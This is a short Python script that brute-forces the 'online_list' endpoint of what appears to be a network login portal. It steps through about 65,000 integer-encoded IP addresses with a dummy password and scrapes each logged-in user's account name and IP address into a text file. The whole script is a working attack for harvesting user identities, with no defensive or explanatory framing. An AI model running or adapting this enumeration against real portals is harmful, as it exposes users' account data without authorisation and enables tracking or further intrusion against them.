import requests
import json
import time

# def ip_to_int(ip_address):
#     # 将 IP 地址分割为四个部分
#     a, b, c, d = map(int, ip_address.split('.'))
#     # 计算整数值
#     return (a << 24) + (b << 16) + (c << 8) + d

def dump():
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    }
    for i in range(168427521,168493055):
      r = requests.get(f'http://xx.xx.xx.xx:801/eportal/portal/online_list?user_account=&user_password=123&wlan_user_mac=000000000000&wlan_user_ip={i}&lang=en',headers=headers)
      if 'succeeded!' in r.text:
        # print('[*] Fine. We\'re able to get the id...')
        origin_data = r.text[12:-2]
        dealjson(origin_data)
        time.sleep(0.5)

def dealjson(origin_data:str) -> None: 
    data_all = json.loads(origin_data)
    data_only = data_all['list'][0]
    for key in data_only:
        tmp_dict = {}
        if key == 'online_ip':
            tmp_dict[key] = data_only[key]
            tmp_dict['user_account'] = data_only['user_account']
            store_data.append(tmp_dict)
            print(f"{GREEN}[+]{RESET}" + f" Get ipAddress {RED}{tmp_dict['online_ip']}{RESET}" + f" for user {RED}{tmp_dict['user_account']}{RESET}")
            continue

def writefile(filename:str,list:list):
    with open(filename,'+a') as file:
        for i in range(len(list)):
          file.writelines(str(list[i]) + '\n')
    

if __name__ == "__main__":
    # ANSI转义序列
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    RESET = "\033[0m"
    store_data = []
    dump()
    print("We're done,now writing the data to the file.\n[!] This can take some time....")
    time.sleep(2)
    writefile('data.txt',store_data)
    print("[+] Done.")
